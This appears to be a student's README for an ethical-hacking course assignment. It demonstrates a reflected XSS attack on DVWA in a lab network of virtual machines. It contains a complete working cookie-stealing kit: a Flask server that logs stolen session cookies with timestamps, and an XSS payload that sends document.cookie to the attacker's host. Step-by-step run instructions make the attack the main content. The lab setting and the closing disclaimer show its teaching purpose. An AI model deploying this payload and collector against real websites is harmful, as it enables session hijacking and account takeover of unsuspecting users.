# Cookie-Stealer

Q2 – Cookie Stealer (CSCI369 Ethical Hacking Assignment)

Description:
-------------
This project demonstrates a reflected XSS attack to steal a session cookie from a vulnerable web application (DVWA) and send it to a Flask server running on the attacker machine (Kali Linux). The stolen cookie is saved with a timestamp into a file called cookies.txt.

Environment Setup:
--------------------
Attacker: Kali Linux (IP: 10.0.2.15)
Victim: Meta2 VM (IP: 10.0.2.4)
Target Web App: DVWA (Damn Vulnerable Web App), accessible at http://10.0.2.4/dvwa

All VMs should be on the same NAT network and able to ping each other.

Files in this folder:
----------------------
1. stealer.py         - Python Flask web server that logs stolen cookies
2. xss_payload.txt    - JavaScript payload used for the XSS injection
3. README.txt         - This file (setup guide and explanation)

==============================
📄 stealer.py (Flask Server)
==============================
# ================================================
# 🍪 Cookie Stealer Flask Server – CSCI369 Assignment Q2
# Sheethal Santhanam (Kali IP: 10.0.2.15)
# Description:
# This Python Flask server runs on the Kali VM (attacker).
# It receives session cookies sent via a reflected XSS payload injected into DVWA.
# Received cookies are stored in cookies.txt with a timestamp.
# ================================================

from flask import Flask, request             # Flask = lightweight Python web framework
from datetime import datetime               # Used to add a timestamp to each stolen cookie

# Create a new Flask app instance
app = Flask(__name__)

# Define route '/' – this receives incoming GET requests
@app.route('/')
def steal_cookie():
    # Get the 'cookie' parameter from the URL (e.g. ?cookie=PHPSESSID=abc123)
    cookie = request.args.get('cookie')

    if cookie:
        # Get current timestamp (formatted)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Write the stolen cookie and timestamp to cookies.txt
        with open("cookies.txt", "a") as f:
            f.write(f"[{timestamp}] Cookie: {cookie}\n")

        return "Cookie received!"  # Response for testing
    return "No cookie found."      # Response if no parameter was provided

# Start the Flask server
# host='0.0.0.0' makes it accessible from other machines (Meta2 VM)
# port=8080 is the attacker's listening port
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

==============================
📄 xss_payload.txt (JavaScript Payload)
==============================
<img src=x onerror="new Image().src='http://10.0.2.15:8080/?cookie='+document.cookie;">

==============================
🛠 Instructions to Run
==============================
1. Set up Flask server on Kali:
   sudo apt update
   sudo apt install python3-venv -y
   mkdir ~/myproject
   cd ~/myproject
   python3 -m venv venv
   source venv/bin/activate
   pip install Flask

   Save stealer.py in this folder
   Run the server:
   
   python3 stealer.py

3. Access DVWA from Kali browser:
   Visit: http://10.0.2.4/dvwa
   Login with: admin / password
   Set security to: Medium
   Navigate to: XSS (Reflected)

4. Inject the payload from xss_payload.txt into the input field and click Submit.

5. To check if the cookie was received:
   cd ~/myproject
   cat cookies.txt

   Example output:
   [2025-07-25 18:43:01] Cookie: PHPSESSID=xyz123; security=medium

==============================
ℹ️ How It Works
==============================
- The attacker injects JavaScript that grabs document.cookie.
- It sends the cookie to the attacker's Flask server via HTTP GET.
- Flask receives it and saves it in cookies.txt with a timestamp.

==============================
⚠️ Disclaimer
==============================
This project is for academic and ethical hacking purposes only. Do not use these techniques on real systems without permission. Unauthorized hacking is illegal.


Assignment Requirements Covered:
-----------------------------------
- Flask app to receive and log cookies ✔
- Timestamp using datetime module ✔
- Final XSS payload in text file ✔
- Tested on DVWA with "Medium" security ✔
